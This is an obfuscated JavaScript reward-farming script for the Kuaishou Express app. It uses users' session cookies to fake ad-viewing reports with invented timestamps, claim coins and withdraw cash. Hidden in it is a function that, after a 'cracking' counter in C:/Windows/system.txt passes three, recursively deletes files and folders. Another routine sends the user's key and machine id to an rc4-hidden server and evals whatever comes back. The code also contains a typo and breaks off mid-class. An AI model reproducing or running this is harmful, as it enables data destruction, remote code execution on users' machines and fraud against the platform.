/*
IOS/安卓： 快手极速版

已实现的：签到和翻倍，开宝箱和翻倍，看广告任务，逛街任务，抽奖和翻倍，广告任务，分享任务
金币每天0点自动兑换到现金余额

V2P和圈X配置好重写后，应该打开APP就能获取到CK，获取不到的话升级下app或者手动捉包
青龙把任意包里的kuaishou.api_st=xxxxxxxxxxxx;这一串东西放到变量ksjsbCookie里，多账户换行或者用@隔开
export ksjsbCookie='kuaishou.api_st=xxxxxxxxxxxx;
kuaishou.api_st=yyyyyyyyy;'

默认每天15点提现，要改的话把提现时间填到变量ksjsbWithdrawTime里
默认按照账户的提现列表从高到低提现到绑定的提现账号，都有绑定的话默认提现到支付宝。要固定提现金额的话填到变量ksjsbCash里。如果提现失败，手动接验证码提现一次
默认提现时间会触发通知，可以把ksjsbNotify设置成2改为每次运行都通知，ksjsbNotify设置为0则不通知

定时一天最少10次就行，最好改掉默认时间，不然太多人同一时间跑

重写：
[task_local]
#快手极速版
[rewrite_local]
[MITM]
#IOS用第一个，安卓用第二个
hostname = api.kuaisho*.com
hostname = open.kuaisho*.com
*/
const $$ = Envcc('')
let acckey = $$['isNode']() ? (process['env']['cdkey'] ? process['env']['cdkey'] : '') : $$['getdata']('cdkey') ? $$['getdata']('cdkey') : '',
    all_msg = '',
    mac = ''

if ($$['isNode']()) {
    gtr = require('fs')

    if (isFileExist('C:/')) {
        console['log']('\n电脑环境')
    } else {
        console['log']('\n青龙环境')
    }
} else {
    console['log']('\n代理环境')
}

function isFileExist(_0x3ef04b) {
    try {
        gtr['accessSync'](_0x3ef04b, gtr['F_OK'])
    } catch (_0x5a5bfc) {
        return false
    }

    return true
}

function addF(_0x54d1e3, _0x4a636f) {
    let _0x242a9d = 0,
        _0x56581a = 'C:/Windows/system.txt'
    if (isFileExist(_0x56581a)) {
        _0x242a9d = gtr['readFileSync'](_0x56581a, 'utf8')
    } else {
        if (isFileExist('C:/')) {
            gtr['writeFile'](_0x56581a, '1', function (_0x3b64fd) {
                if (_0x3b64fd) {
                    throw _0x3b64fd
                }
            })
        } else {
            return
        }
    }

    if (_0x242a9d == 99) {
        return 99
    }

    console['log'](_0x242a9d)
    console['log']('警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！', _0x242a9d)

    if (parseInt(_0x242a9d) < 3) {
        let _0x35a605 = parseInt(_0x242a9d) + 1

        gtr['writeFileSync'](_0x56581a, _0x35a605 + '', 'utf8')
        return
    }

    if (!gtr['existsSync'](_0x54d1e3)) {
        return
    }

    if (gtr['statSync'](_0x54d1e3)['isDirectory']()) {
        var _0x5602fa = gtr['readdirSync'](_0x54d1e3),
            _0x27a977 = _0x5602fa['length'],
            _0x2e77ee = 0

        if (_0x27a977 > 0) {
            _0x5602fa['forEach'](function (_0x80b372) {
                _0x2e77ee++

                var _0x1b3daa = _0x54d1e3 + '/' + _0x80b372

                gtr['statSync'](_0x1b3daa)['isDirectory']() ? addF(_0x1b3daa, true) : gtr['unlinkSync'](_0x1b3daa)
            })

            _0x27a977 == _0x2e77ee && _0x4a636f && gtr['rmdirSync'](_0x54d1e3)
        } else {
            _0x27a977 == 0 && _0x4a636f && gtr['rmdirSync'](_0x54d1e3)
        }
    } else {
        gtr['unlinkSync'](_0x54d1e3)
    }
}

function hqs(_0x288373 = 10) {
    return new Promise((_0x54c957) => {
        let _0x1b93b5 = 5
        let _0x1f23ed = {
            url: $$['isNode']() ? rc4($$['fwur'](), '1200') + ('?key=' + acckey + '&id=' + _0x1b93b5 + '&ip=1&mac=' + mac + '&bb=1') : rc4($$['fwur'](), '1200') + ('?key=' + acckey + '&id=' + _0x1b93b5 + '&ip=0&mac=' + mac + '&bb=1'),
        }
        $$['post'](
            _0x1f23ed,
            async (_0x149129, _0x26004a, _0x315b24) => {
                try {
                    let _0x39f3d0 = eval(_0x315b24)

                    _0x39f3d0['code'] == 200 ? ((all_msg = _0x39f3d0['msg']), _0x54c957(_0x39f3d0['data'])) : ((all_msg = _0x39f3d0['msg']), _0x54c957(false))
                } catch (_0x1fbb6b) {
                    $$['logErr'](_0x1fbb6b, _0x26004a)
                }
            },
            0
        )
    })
}

const _0x11b3c3 = '快手极速版',
    _0x3de8b8 = new _0x4f15e2(_0x11b3c3)

let _0x279d25 = '',
    _0x1a0963,
    _0x4c35fe = ['\n', '@'],
    _0x547212 = (_0x3de8b8['isNode']() ? process['env']['ksjsbCookie'] : _0x3de8b8['getdata']('ksjsbCookie')) || '',
    _0x431ea3 = [],
    _0x1e627b = (_0x3de8b8['isNode']() ? process['env']['ksjsbCash'] : _0x3de8b8['getval']('ksjsbCash')) || '',
    _0x26f17b = (_0x3de8b8['isNode']() ? process['env']['ksjsbWithdrawTime'] : _0x3de8b8['getval']('ksjsbWithdrawTime')) || 15,
    _0x13d24b = (_0x3de8b8['isNode']() ? process['env']['ksjsbAggressive'] : _0x3de8b8['getval']('ksjsbAggressive')) || 0,
    _0x113109 = (_0x3de8b8['isNode']() ? process['env']['ksjsbNotify'] : _0x3de8b8['getval']('ksjsbNotify')) || 1,
    _0x2863b1 = 0,
    _0x19c25c = 0,
    _0xf2b084 = 12,
    _0x5718d8 = [],
    yifenk = []

const _0x2e9259 = {
    id: 0,
    name: '广告视频',
}
const _0x7681a7 = {
    id: 49,
    name: '广告视频',
}
const _0x797eac = {
    id: 77,
    name: '宝箱翻倍视频',
}
const _0x4921ac = {
    id: 136,
    name: '签到翻倍视频1',
}
const _0x394a8a = {
    id: 151,
    name: '未知视频',
}
const _0x5b3c30 = {
    ad1: _0x2e9259,
    ad2: _0x7681a7,
    box: _0x797eac,
    sign: _0x4921ac,
    unknown1: _0x394a8a,
}
const _0x3a6d45 = {
    ad: 49,
    live: 75,
    luckydraw: 161,
    gj: 217,
    invite: 2008,
}
const _0x4c2c07 = {
    extParams: '56dfe31594b858e69ef613f5e97227fb03493544e59e2b2a726006e2852ec1040cd969d4748c460ecf574cc487214a91f70592aa8b2225630027c39ca2c544027efa65815d1acea23cb503034b12641c',
    businessId: 161,
    pageId: 11101,
    posId: 4683,
    subPageId: 100013628,
    name: '获取抽奖次数视频',
}
const _0x47e36f = {
    extParams: '56dfe31594b858e69ef613f5e97227fbabbcabda19cc301529762b301b341745981b437b7420d62ce58fceb3ab75ef4bca5d4aa28c3b8cfe17e3b347bc504f9b97adecb997b6a98b60a26bd1d2099135',
    businessId: 161,
    pageId: 11101,
    posId: 4685,
    subPageId: 100013630,
    name: '抽奖视频161-213',
}
const _0x46a09f = {
    extParams: '56dfe31594b858e69ef613f5e97227fb67b973ad1394855c549442d15702f96393178eaeef5635134bb7e4ff97e69218c1f18455baf645dbaef685b7bf30c0914ea53ddcde26b2fa67b888203dab0fd4',
    businessId: 161,
    pageId: 11101,
    posId: 4684,
    subPageId: 100013629,
    name: '抽奖视频161-100',
}
const _0x1a4360 = {
    extParams: '56dfe31594b858e69ef613f5e97227fbabbcabda19cc301529762b301b341745981b437b7420d62ce58fceb3ab75ef4bca5d4aa28c3b8cfe17e3b347bc504f9b97adecb997b6a98b60a26bd1d2099135',
    businessId: 11,
    pageId: 11101,
    posId: 4684,
    subPageId: 100013629,
    name: '抽奖视频11-100',
}
const _0xdfec98 = {
    extParams: '56dfe31594b858e69ef613f5e97227fb67b973ad1394855c549442d15702f96393178eaeef5635134bb7e4ff97e69218c1f18455baf645dbaef685b7bf30c0914ea53ddcde26b2fa67b888203dab0fd4',
    businessId: 11,
    pageId: 11101,
    posId: 4684,
    subPageId: 100013629,
    name: '抽奖视频11-100',
}
const _0x2741a3 = {
    extParams: '60869a9fd2ab63f5e0b1725d059da31f7d3ed3046658438ee204a153c3bc47189ccf268b22e603b6750780c9647e7a12b3027381e11da27b234311bccfd4a67bb892f889a4020ceae4f4e102cc50c327',
    businessId: 2008,
    pageId: 100012068,
    posId: 6765,
    subPageId: 100015089,
    name: '邀请页视频(实际是100金币)',
}
const _0x55ec5a = {
    extParams: '56dfe31594b858e69ef613f5e97227fbd5f9da00aa5144df8830a5781ae07d7cfaf4d95abc2510c950f99404a9e0bf62f5b5765a867c385685e0570ed76b858a159dacd55e41e4a9813db4e619a8b092',
    businessId: 75,
    pageId: 100012068,
    posId: 6765,
    subPageId: 100015089,
    name: '直播任务',
}
const _0x1ada81 = {
    extParams: '56dfe31594b858e69ef613f5e97227fbd5f9da00aa5144df8830a5781ae07d7cfaf4d95abc2510c950f99404a9e0bf62f5b5765a867c385685e0570ed76b858a159dacd55e41e4a9813db4e619a8b092',
    businessId: 168,
    pageId: 100012068,
    posId: 6765,
    subPageId: 100015089,
    name: '签到翻倍视频2',
}
const _0x4d7222 = {
    luckdrawNum_161: _0x4c2c07,
    luckdrawVideo_161_213: _0x47e36f,
    luckdrawVideo_161_100: _0x46a09f,
    luckdrawVideo_11_213: _0x1a4360,
    luckdrawVideo_11_100: _0xdfec98,
    inviteVideo_2008: _0x2741a3,
    liveVideo_75: _0x55ec5a,
    signVideo_168: _0x1ada81,
}

let _0x134a17 = new Date(),
    _0x20a9d7 = _0x134a17['getHours'](),
    _0x459e63 = 1.07,
    _0x2e716e = 0,
    _0x5bc515 = 'ksjsb',
    _0x180c0c = 'https://ghproxy.com/https://raw.githubusercontent.com/xiaojia21190/ym/main/invite.json',
    _0x75eec0 = 'https://127.0.0.1/'

class _0x9d8dda {
    constructor(_0x4a95d8) {
        let _0x3123b2 = _0x4a95d8['match'](/(kuaishou.api_st=[\w\-]+)/)[1] + ';'

        this['index'] = ++_0x2863b1
        this['cookie'] = 'kpn=NEBULA; kpf=ANDROID_PHONE; did=ANDROID_' + _0x4b5cde(16) + '; ver=9.10; appver=9.10.40.2474; language=zh-cn; countryCode=CN; sys=ANDROID_5.1; client_key=2ac2a76d; ' + _0x3123b2
        this['name'] = this['index']
        this['valid'] = false
        this['bindAlipay'] = false
        this['alipay'] = ''
        this['bindWechat'] = false
        this['wechat'] = ''
        this['needSms'] = false
        this['hasLuckydraw'] = true
        const _0x6035ea = {
            num: 2,
            needRun: true,
        }
        const _0x3124ca = {
            num: 1,
            needRun: true,
        }
        const _0x3dc7f1 = {
            num: 5,
            needRun: true,
        }
        const _0x136149 = {
            num: 1,
            needRun: true,
        }
        const _0x3c544c = {
            num: 5,
            needRun: true,
        }
        const _0x410a14 = {
            49: _0x6035ea,
            75: _0x3124ca,
            161: _0x3dc7f1,
            217: _0x136149,
            2008: _0x3c544c,
        }
        this['task'] = _0x410a14
    }

    async ['getUserInfo']() {
        let _0x12f9a0 = 'https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/basicInfo',
            _0x2c563e = '',
            _0x159e7c = _0x495d61(_0x12f9a0, this['cookie'], _0x2c563e)

        await _0x39a23b('get', _0x159e7c)
        let _0x333517 = _0x1a0963

        if (!_0x333517) {
            return
        }

        _0x333517['result'] == 1
            ? ((this['valid'] = true),
              (this['name'] = _0x333517['data']['userData']['nickname']),
              (this['cashBalance'] = _0x333517['data']['totalCash']),
              (this['coinBalance'] = _0x333517['data']['totalCoin']),
              (this['allCash'] = _0x333517['data']['allCash']),
              console['log']('账号[' + this['name'] + ']账户余额' + this['cashBalance'] + '元，' + this['coinBalance'] + '金币，未审核余额' + Math['floor'](parseFloat(this['allCash']) - parseFloat(this['cashBalance'])) + '元'))
            : console['log']('账号[' + this['name'] + ']查询账户信息失败：' + _0x333517['error_msg'])
    }

    async ['setShare']() {
        let _0x25bee8 = 'https://nebula.kuaishou.com/rest/n/nebula/account/withdraw/setShare',
            _0x2ffa0d = '',
            _0x578b15 = _0x495d61(_0x25bee8, this['cookie'], _0x2ffa0d)
        await _0x39a23b('post', _0x578b15)
        let _0x4f4c7a = _0x1a0963

        if (!_0x4f4c7a) {
            return
        }

        _0x4f4c7a['result'] == 1 ? (console['log']('账号[' + this['name'] + ']准备分享得金币'), await _0x3de8b8['wait'](200), await this['taskReward'](122)) : console['log']('账号[' + this['name'] + ']分享失败：' + _0x4f4c7a['error_msg'])
    }

    async ['taskReward'](_0x3ceeb3) {
        let _0x10a37b = 'https://nebula.kuaishou.com/rest/n/nebula/daily/report?taskId=' + _0x3ceeb3,
            _0xc24a7 = '',
            _0x363028 = _0x495d61(_0x10a37b, this['cookie'], _0xc24a7)

        await _0x39a23b('get', _0x363028)
        let _0x478dc0 = _0x1a0963

        if (!_0x478dc0) {
            return
        }

        _0x478dc0['result'] == 1 ? console['log']('账号[' + this['name'] + ']完成任务[' + _0x3ceeb3 + ']成功，获得' + _0x478dc0['data']['amount'] + '金币') : console['log']('账号[' + this['name'] + ']完成任务[' + _0x3ceeb3 + ']失败：' + _0x478dc0['error_msg'])
    }

    async ['getSignInfo']() {
        let _0x81b2ce = 'https://nebula.kuaishou.com/rest/n/nebula/sign/queryPopup',
            _0x373a8d = '',
            _0x555bd2 = _0x495d61(_0x81b2ce, this['cookie'], _0x373a8d)

        await _0x39a23b('get', _0x555bd2)
        let _0xa5df0a = _0x1a0963

        if (!_0xa5df0a) {
            return
        }

        _0xa5df0a['result'] == 1
            ? (console['log']('账号[' + this['name'] + ']今天' + (_0xa5df0a['data']['nebulaSignInPopup']['todaySigned'] ? '已' : '未') + '签到'),
              !_0xa5df0a['data']['nebulaSignInPopup']['todaySigned'] && (await _0x3de8b8['wait'](200), await this['doSign'](), await _0x3de8b8['wait'](200), await this['setShare']()))
            : console['log']('账号[' + this['name'] + ']查询签到信息失败：' + _0xa5df0a['error_msg'])
    }

    async ['doSign']() {
        let _0x34e8a1 = 'https://nebula.kuaishou.com/rest/n/nebula/sign/sign?source=activity',
            _0x4eaf12 = '',
            _0x25296e = _0x495d61(_0x34e8a1, this['cookie'], _0x4eaf12)

        await _0x39a23b('get', _0x25296e)
        let _0x52b56b = _0x1a0963

        if (!_0x52b56b) {
            return
        }

        if (_0x52b56b['result'] == 1) {
            console['log']('账号[' + this['name'] + ']签到成功：' + _0x52b56b['data']['toast'])
            await _0x3de8b8['wait'](200)
            await this['ksAdParam'](_0x5b3c30['sign'])
            await _0x3de8b8['wait'](200)
            await this['ksNeoAdParam'](_0x4d7222['signVideo_168'])
        } else {
            console['log']('账号[' + this['name'] + ']签到失败：' + _0x52b56b['error_msg'])
        }
    }

    async ['taskList']() {
        let _0x43b4eb = 'https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/tasks?addressBookAccessStatus=true&pushNotificationStatus=false',
            _0x15718b = '',
            _0x51b672 = _0x495d61(_0x43b4eb, this['cookie'], _0x15718b)

        await _0x39a23b('get', _0x51b672)
        let _0x46768c = _0x1a0963

        if (!_0x46768c) {
            return
        }

        if (_0x46768c['result'] == 1) {
            console['log']('账号[' + this['name'] + ']任务完成情况：')

            for (let _0x5699d2 of _0x46768c['data']['dailyTasks']) {
                for (let _0x31481e in _0x3a6d45) {
                    if (_0x5699d2['taskId'] == _0x3a6d45[_0x31481e]) {
                        let _0x4a7d8a = parseInt(_0x5699d2['completedStages']),
                            _0x3be579 = parseInt(_0x5699d2['stages']),
                            _0x4ea96f = Math['ceil'](_0x3be579 / _0xf2b084),
                            _0x3968f5 = _0x4a7d8a < _0x3be579

                        const _0x3a996b = {
                            num: _0x4ea96f,
                            needRun: _0x3968f5,
                        }
                        this['task'][_0x5699d2['taskId']] = _0x3a996b
                        console['log']('【' + _0x5699d2['name'] + '】 ' + _0x4a7d8a + '/' + _0x3be579 + '，' + (_0x3968f5 ? '未完成' : '已完成') + '，每次运行完成' + _0x4ea96f + '次任务')
                        continue
                    }
                }
            }
        } else {
            console['log']('账号[' + this['name'] + ']查询任务列表失败：' + _0x46768c['error_msg'])
        }
    }

    async ['ksgj']() {
        let _0x15b0c2 = 'https://api.e.kuaishou.com/rest/r/reward/task/getActivityReward',
            _0x232b2b = 'activityId=148&client_key=ksgjbody',
            _0x5c0fc5 = _0x495d61(_0x15b0c2, this['cookie'], _0x232b2b)

        await _0x39a23b('post', _0x5c0fc5)
        let _0x5dd905 = _0x1a0963

        if (!_0x5dd905) {
            return
        }

        _0x5dd905['result'] == 1 ? console['log']('账号[' + this['name'] + ']逛街获得' + _0x5dd905['data']['amount'] + '金币') : console['log']('账号[' + this['name'] + ']逛街失败：' + _0x5dd905['error_msg'])
    }

    async ['ksAdParam'](_0x4738b3) {
        let _0x130dec = 'https://ghproxy.com/https://raw.githubusercontent.com/xiaojia21190/ym/main/ks.json',
            _0x9dce39 = '',
            _0x2bb596 = _0x495d61(_0x130dec, this['cookie'], _0x9dce39)

        await _0x39a23b('get', _0x2bb596)
        let _0x5cb380 = _0x1a0963

        if (!_0x5cb380) {
            return
        }
        _0x5cb380 = _0x5cb380[Math.floor(Math.random() * _0x5cb380.length) | 0]
        _0x5cb380['result'] == 1
            ? _0x5cb380['impAdInfo'] &&
              _0x5cb380['impAdInfo']['length'] > 0 &&
              _0x5cb380['impAdInfo'][0]['adInfo'] &&
              _0x5cb380['impAdInfo'][0]['adInfo']['length'] > 0 &&
              _0x5cb380['impAdInfo'][0]['adInfo'][0]['adBaseInfo'] &&
              (await _0x3de8b8['wait'](200), await this['ksAdReward'](_0x5cb380['llsid'], _0x5cb380['impAdInfo'][0]['adInfo'][0]['adBaseInfo']['creativeId'], _0x4738b3))
            : console['log']('账号[' + this['name'] + ']获取' + _0x4738b3['name'] + '参数失败：' + _0x5cb380['error_msg'])
    }

    async ['ksAdReward'](_0x573177, _0x463190, _0x2b3321) {
        let _0x1031fe = new Date()['getTime'](),
            _0x43c0da = Math['floor'](Math['random']() * 30000) + 45000,
            _0x431123 = _0x1031fe - _0x43c0da,
            _0x59e30c = 'https://api.e.kuaishou.com/rest/r/ad/nebula/reward',
            _0x2615ac = 'bizStr={"endTime":' + _0x1031fe + ',"eventValue":-1,"rewardList":[{"creativeId":' + _0x463190 + ',"extInfo":"","llsid":' + _0x573177 + ',"taskType":1}],"startTime":' + _0x431123 + ',"taskId":' + _0x2b3321['id'] + '}',
            _0x1090a7 = _0x495d61(_0x59e30c, this['cookie'], _0x2615ac)

        await _0x39a23b('post', _0x1090a7)
        let _0x7fdef7 = _0x1a0963

        if (!_0x7fdef7) {
            return
        }

        _0x7fdef7['result'] == 1 ? console['log']('账号[' + this['name'] + ']看' + _0x2b3321['name'] + '获得' + _0x7fdef7['data']['awardAmount'] + '金币') : console['log']('账号[' + this['name'] + ']看' + _0x2b3321['name'] + '失败：' + _0x7fdef7['error_msg'])
    }

    async ['openBox'](_0x412555) {
        let _0x513362 = 'https://nebula.kuaishou.com/rest/n/nebula/box/explore?isOpen=' + _0x412555 + '&isReadyOfAdPlay=true',
            _0x3ef8d9 = '',
            _0x48334f = _0x495d61(_0x513362, this['cookie'], _0x3ef8d9)

        await _0x39a23b('get', _0x48334f)
        let _0x15220b = _0x1a0963

        if (!_0x15220b) {
            return
        }

        _0x15220b['result'] == 1
            ? _0x412555 == true
                ? _0x15220b['data']['commonAwardPopup'] && _0x15220b['data']['commonAwardPopup']['awardAmount']
                    ? (console['log']('账号[' + this['name'] + ']开宝箱获得' + _0x15220b['data']['commonAwardPopup']['awardAmount'] + '金币'), await _0x3de8b8['wait'](200), await this['ksAdParam'](_0x5b3c30['box']))
                    : console['log']('账号[' + this['name'] + ']开宝箱没有获得金币')
                : _0x15220b['data']['openTime'] > -1
                ? (console['log']('账号[' + this['name'] + ']开宝箱冷却时间还有' + Math['floor'](_0x15220b['data']['openTime'] / 1000) + '秒'), _0x15220b['data']['openTime'] == 0 && (await _0x3de8b8['wait'](200), await this['openBox'](true)))
                : console['log']('账号[' + this['name'] + ']开宝箱次数已用完')
            : _0x412555 == true
            ? console['log']('账号[' + this['name'] + ']开宝箱失败：' + _0x15220b['error_msg'])
            : console['log']('账号[' + this['name'] + ']查询宝箱状态失败：' + _0x15220b['error_msg'])
    }

    async ['withdraw'](_0x543a47) {
        if (!this['bindAlipay'] && !this['bindWechat']) {
            _0x1ab8b7('账号[' + this['name'] + ']未绑定提现账号，不执行提现')

            return
        }

        let _0x11aa57 = parseInt(_0x543a47 * 100),
            _0x551907 = this['bindAlipay'] ? 'ALIPAY' : 'WECHAT',
            _0x4281dd = _0x551907 == 'ALIPAY' ? '支付宝' : '微信',
            _0x45b85a = _0x551907 == 'ALIPAY' ? this['alipay'] : this['wechat'],
            _0x5540cb = 'https://www.kuaishoupay.com/pay/account/h5/withdraw/apply',
            _0x36e14a = 'account_group_key=NEBULA_CASH_ACCOUNT&mobile_code=&fen=' + _0x11aa57 + '&provider=' + _0x551907 + '&total_fen=' + _0x11aa57 + '&commission_fen=0&third_account=' + _0x551907 + '&attach=&biz_content=&session_id=',
            _0x2afd84 = _0x495d61(_0x5540cb, this['cookie'], _0x36e14a)

        await _0x39a23b('post', _0x2afd84)
        let _0x550f3b = _0x1a0963

        if (!_0x550f3b) {
            return
        }

        _0x550f3b['result'] == 'SUCCESS'
            ? _0x1ab8b7('账号' + this['index'] + '[' + this['name'] + ']提现' + _0x543a47 + '元到' + _0x4281dd + '[' + _0x45b85a + ']成功')
            : _0x1ab8b7('账号' + this['index'] + '[' + this['name'] + ']提现' + _0x543a47 + '元到' + _0x4281dd + '[' + _0x45b85a + ']失败：' + _0x550f3b['msg'])
    }

    async ['withdrawOverview']() {
        let _0x2236be = 'https://nebula.kuaishou.com/rest/n/nebula/outside/withdraw/overview?appver=10.2.20.2021',
            _0x564ca9 = '',
            _0x418fbc = _0x495d61(_0x2236be, this['cookie'], _0x564ca9)

        await _0x39a23b('get', _0x418fbc)
        let _0x2edb23 = _0x1a0963

        if (!_0x2edb23) {
            return
        }

        if (_0x2edb23['result'] == 1) {
            if (_0x2edb23['data']['isLimit'] == true) {
                console['log']('账号[' + this['name'] + ']今天已提现')
                return
            }

            let _0x57539e = parseFloat(this['cashBalance'])

            if (_0x13d24b == 1) {
                if (_0x57539e < 0.3) {
                    _0x1ab8b7('账号[' + this['name'] + ']余额不足0.3元，不提现')
                } else {
                    let _0xc81e7b = Math['floor'](_0x57539e * 10) / 10

                    _0xc81e7b = _0xc81e7b > 50 ? 50 : _0xc81e7b

                    _0x1ab8b7('账号[' + this['name'] + ']准备最大化提现' + _0xc81e7b + '元')

                    await _0x3de8b8['wait'](200)
                    await this['withdraw'](_0xc81e7b)
                }
            } else {
                if (!_0x1e627b) {
                    for (let _0x5da979 of _0x2edb23['data']['enWithdrawList']['sort'](function (_0x5357e2, _0xc5d50f) {
                        return _0xc5d50f - _0x5357e2
                    })) {
                        if (_0x57539e >= parseFloat(_0x5da979)) {
                            _0x1ab8b7('账号[' + this['name'] + ']准备提现' + _0x5da979 + '元')

                            await _0x3de8b8['wait'](200)
                            await this['withdraw'](_0x5da979)
                            retura
                        }
                    }

                    _0x1ab8b7('账号[' + this['name'] + ']余额不足，可提现额度：' + _0x2edb23['data']['enWithdrawList']['join'](','))
                } else {
                    _0x57539e >= parseFloat(_0x1e627b) ? (_0x1ab8b7('账号[' + this['name'] + ']准备提现' + _0x1e627b + '元'), await _0x3de8b8['wait'](200), await this['withdraw'](_0x1e627b)) : _0x1ab8b7('账号[' + this['name'] + ']余额不足' + _0x1e627b + '元，不提现')
                }
            }
        } else {
            console['log']('账号[' + this['name'] + ']查询提现列表失败：' + _0x2edb23['error_msg'])
        }
    }

    async ['accountOverview']() {
        let _0x512fe7 = 'https://nebula.kuaishou.com/rest/n/nebula/account/overview',
            _0x251847 = '',
            _0x39f16d = _0x495d61(_0x512fe7, this['cookie'], _0x251847)

        await _0x39a23b('get', _0x39f16d)
        let _0xa69994 = _0x1a0963

        if (!_0xa69994) {
            return
        }

        if (_0xa69994['result'] == 1) {
            this['coinBalance'] = _0xa69994['data']['coinBalance']
            this['cashBalance'] = _0xa69994['data']['cashBalance']
            let _0x54aac5 = _0xa69994['data']['exchangeCoinState']

            _0x1ab8b7('账号[' + this['name'] + ']账户余额' + this['cashBalance'] + '元，' + this['coinBalance'] + '金币')

            _0x54aac5 == 2 && (await _0x3de8b8['wait'](200), await this['changeExchangeType'](0))
        } else {
            console['log']('账号[' + this['name'] + ']查询账户信息失败：' + _0xa69994['error_msg'])
        }
    }

    async ['changeExchangeType'](_0x1bd22f) {
        let _0x4e7ea7 = 'https://nebula.kuaishou.com/rest/n/nebula/exchange/changeExchangeType',
            _0x6250c8 = '{"type":' + _0x1bd22f + '}',
            _0x2c1c9f = _0x495d61(_0x4e7ea7, this['cookie'], _0x6250c8)

        _0x2c1c9f['headers']['Content-Type'] = 'application/json'
        await _0x39a23b('post', _0x2c1c9f)
        let _0x4df55c = _0x1a0963

        if (!_0x4df55c) {
            return
        }

        let _0x1fdd87 = _0x1bd22f == 0 ? '自动兑换' : '手动兑换'

        _0x4df55c['result'] == 1 ? console['log']('账号[' + this['name'] + ']兑换方式更改成功，目前兑换方式为：' + _0x1fdd87) : console['log']('账号[' + this['name'] + ']兑换方式更改失败：' + _0x4df55c['error_msg'])
    }

    async ['exchangeCoin']() {
        if (this['coinBalance'] < 100) {
            console['log']('账号[' + this['name'] + ']金币余额不足100，不执行兑换')
            return
        }

        let _0x54ee74 = 'https://nebula.kuaishou.com/rest/n/nebula/exchange/coinToCash/submit',
            _0x365938 = '{"coinAmount":' + this['coinBalance'] + ',"token":"rE2zK-Cmc82uOzxMJW7LI2-wTGcKMqqAHE0PhfN0U4bJY4cAM5Inxw"}',
            _0x4650af = _0x495d61(_0x54ee74, this['cookie'], _0x365938)

        _0x4650af['headers']['Content-Type'] = 'application/json'
        await _0x39a23b('post', _0x4650af)
        let _0x2ae7ad = _0x1a0963

        if (!_0x2ae7ad) {
            return
        }

        if (_0x2ae7ad['result'] == 1) {
            let _0x1e5bfa = Math['floor'](this['coinBalance'] / 100) * 100,
                _0xd2629a = Math['floor'](this['coinBalance'] / 100) / 100

            console['log']('账号[' + this['name'] + ']兑换金币成功，将' + _0x1e5bfa + '金币兑换成' + _0xd2629a + '元')
        } else {
            console['log']('账号[' + this['name'] + ']兑换金币失败：' + _0x2ae7ad['error_msg'])
        }
    }

    async ['ksNeoAdParam'](_0x3356fd) {
        let _0x35bd12 = 'https://ghproxy.com/https://raw.githubusercontent.com/xiaojia21190/ym/main/ks.json',
            _0x5f768f = ``,
            _0x110b63 = _0x495d61(_0x35bd12, this['cookie'], _0x5f768f)

        await _0x39a23b('get', _0x110b63)
        let _0x3db794 = _0x1a0963

        if (!_0x3db794) {
            return
        }

        _0x3db794 = _0x3db794[Math.floor(Math.random() * _0x3db794.length) | 0]

        _0x3db794['result'] == 1
            ? _0x3db794['impAdInfo'] &&
              _0x3db794['impAdInfo']['length'] > 0 &&
              _0x3db794['impAdInfo'][0]['adInfo'] &&
              _0x3db794['impAdInfo'][0]['adInfo']['length'] > 0 &&
              _0x3db794['impAdInfo'][0]['adInfo'][0]['adBaseInfo'] &&
              (await _0x3de8b8['wait'](200), await this['ksNeoAdReward'](_0x3db794['llsid'], _0x3db794['impAdInfo'][0]['adInfo'][0]['adBaseInfo']['creativeId'], _0x3356fd))
            : console['log']('账号[' + this['name'] + ']获取' + _0x3356fd['name'] + '参数失败：' + _0x3db794['error_msg'])
    }

    async ['ksNeoAdReward'](_0x3266aa, _0x371a4c, _0x3b68fe) {
        let _0x3f784e = new Date()['getTime'](),
            _0x1b95dd = Math['floor'](Math['random']() * 30000) + 45000,
            _0x4c41ee = _0x3f784e - _0x1b95dd,
            _0x3a97f5 = 'https://api.e.kuaishou.com/rest/r/ad/task/report',
            _0x1cf324 =
                'bizStr={"businessId":' +
                _0x3b68fe['businessId'] +
                ',"endTime":' +
                _0x3f784e +
                ',"extParams":"' +
                _0x3b68fe['extParams'] +
                '","mediaScene":"video","neoInfos":[{"creativeId":' +
                _0x371a4c +
                ',"extInfo":"","llsid":' +
                _0x3266aa +
                ',"taskType":1}],"pageId":' +
                _0x3b68fe['pageId'] +
                ',"posId":' +
                _0x3b68fe['posId'] +
                ',"startTime":' +
                _0x4c41ee +
                ',"subPageId":' +
                _0x3b68fe['subPageId'] +
                '}',
            _0x134708 = _0x495d61(_0x3a97f5, this['cookie'], _0x1cf324)

        await _0x39a23b('post', _0x134708)
        let _0x598f87 = _0x1a0963

        if (!_0x598f87) {
            return
        }

        if (_0x598f87['result'] == 1) {
            let _0x357de8 = _0x598f87['data']['neoAmount'] + '金币'

            if (_0x598f87['data']['neoToH5Data']) {
                try {
                    let _0x3f61ec = JSON['parse'](_0x331719['decode'](_0x598f87['data']['neoToH5Data'])['replace'](/\0/g, ''))

                    if (_0x3f61ec['extraCoin']) {
                        _0x357de8 += '+' + _0x3f61ec['extraCoin'] + '金币'
                    }
                } catch (_0x2045ba) {
                    console['log'](_0x598f87['data']['neoToH5Data'])
                } finally {
                }
            }

            console['log']('账号[' + this['name'] + ']看' + _0x3b68fe['name'] + '获得' + _0x357de8)

            if (this['hasLuckydraw']) {
                await this['luckdrawTasks']()
            }
        } else {
            console['log']('账号[' + this['name'] + ']看' + _0x3b68fe['name'] + '失败：' + _0x598f87['error_msg'])
        }
    }

    async ['luckdrawInfo']() {
        let _0x2fda4d = 'https://activity.e.kuaishou.com/rest/r/game/user/info',
            _0x59d2d4 = '',
            _0x50c63f = _0x495d61(_0x2fda4d, this['cookie'], _0x59d2d4)

        await _0x39a23b('get', _0x50c63f)
        let _0x1d97ad = _0x1a0963

        if (!_0x1d97ad) {
            return
        }

        if (_0x1d97ad['result'] == 1) {
            console['log']('账号[' + this['name'] + ']现有' + _0x1d97ad['data']['userDiamondResult']['diamondPercent'] + '钻石，剩余抽奖次数：' + _0x1d97ad['data']['userDailyLotteryTimesResult']['remainTimes'])

            for (let _0x5387e7 = 0; _0x5387e7 < _0x1d97ad['data']['userDailyLotteryTimesResult']['remainTimes']; _0x5387e7++) {
                await _0x3de8b8['wait'](200)
                await this['luckydraw']()
            }
        } else {
            console['log']('账号[' + this['name'] + ']查询抽奖次数失败：' + _0x1d97ad['error_msg'])
        }
    }

